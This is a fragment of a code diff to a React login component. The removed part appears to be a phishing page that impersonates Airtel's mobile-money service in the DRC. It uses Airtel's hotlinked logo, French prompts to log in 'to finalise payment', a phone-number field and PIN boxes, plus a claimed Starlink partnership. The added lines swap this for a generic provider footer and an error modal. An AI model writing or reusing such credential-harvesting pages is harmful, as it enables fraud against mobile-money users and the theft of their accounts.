-            <p className="error-modal-message" style={{ whiteSpace: 'pre-line' }}>{errorMessage}</p>
-            <button className="error-modal-button" onClick={closeErrorModal}>OK</button>
+      {/* Footer */}
+      <footer className="login-footer">
+        <p>🇨🇩 DRC Data Services — {providerCfg.name}</p>
+      </footer>
+
+      {/* Error Modal */}
+      {error && (
+        <div className="error-modal-overlay" onClick={() => setError(null)}>
+          <div className="error-modal" onClick={(e) => e.stopPropagation()}>
+            <div className="error-icon">⚠️</div>
+            <h3>Something Went Wrong</h3>
+            <p>{error}</p>
+            <button onClick={() => setError(null)}>OK</button>
           </div>
         </div>
       )}
-
-      <div className="login-header">
-        <div className="logo-large">
-          <img src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg" alt="Airtel Logo" />
-        </div>
-      </div>
-
-      <div className="login-content">
-        <h1 className="login-title">Connectez-vous à Airtel Lite pour finaliser le paiement.</h1>
-
-        {serverStatus?.error && (
-          <div className="server-status-message error"><p>⚠️ {serverStatus.error}</p></div>
-        )}
-
-        <form className="login-form" onSubmit={handleLogin}>
-          <div className="phone-input-container">
-            <div className="country-code">
-              <span className="flag-icon">🇨🇩</span>
-              <span>+243</span>
-            </div>
-            <input type="tel" className="phone-input" value={phoneNumber}
-              onChange={handlePhoneChange} onPaste={handlePhonePaste}
-              placeholder="951234567" maxLength="10" inputMode="numeric"
-              pattern="[0-9]*" required disabled={serverStatus?.isChecking} />
-          </div>
-
-          <div className="pin-section">
-            <p className="pin-label">Entrez votre Code</p>
-            <div className="pin-inputs-wrapper">
-              <div className="pin-inputs">
-                {pin.map((digit, index) => (
-                  <input key={index} ref={pinRefs[index]}
-                    type={showPin ? 'text' : 'password'} className="pin-box"
-                    value={digit} onChange={(e) => handlePinChange(index, e.target.value)}
-                    onKeyDown={(e) => handlePinKeyDown(index, e)}
-                    onKeyPress={handlePinKeyPress} onPaste={(e) => handlePinPaste(e, index)}
-                    maxLength="1" inputMode="numeric" pattern="[0-9]" required
-                    disabled={serverStatus?.isChecking} />
-                ))}
-              </div>
-              <button type="button" className="eye-button" onClick={() => setShowPin(!showPin)}
-                aria-label={showPin ? 'Masquer le PIN' : 'Afficher le PIN'}
-                disabled={serverStatus?.isChecking}>
-                {showPin ? '👁️' : '👁️‍🗨️'}
-              </button>
-            </div>
-          </div>
-
-          <button type="submit" className={buttonState.className} disabled={buttonState.disabled}>
-            {buttonState.text}
-          </button>
-        </form>
-      </div>
-
-      <div className="login-footer">
-        <div><img src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg" alt="Airtel Logo" /></div>
-        <span>En collaboration avec</span>
-        <span>STARLINK™</span>
-        <footer className="footer">© 2026 Airtel Congo. Tous droits réservés.</footer>
-      </div>
     </div>
   );
 }
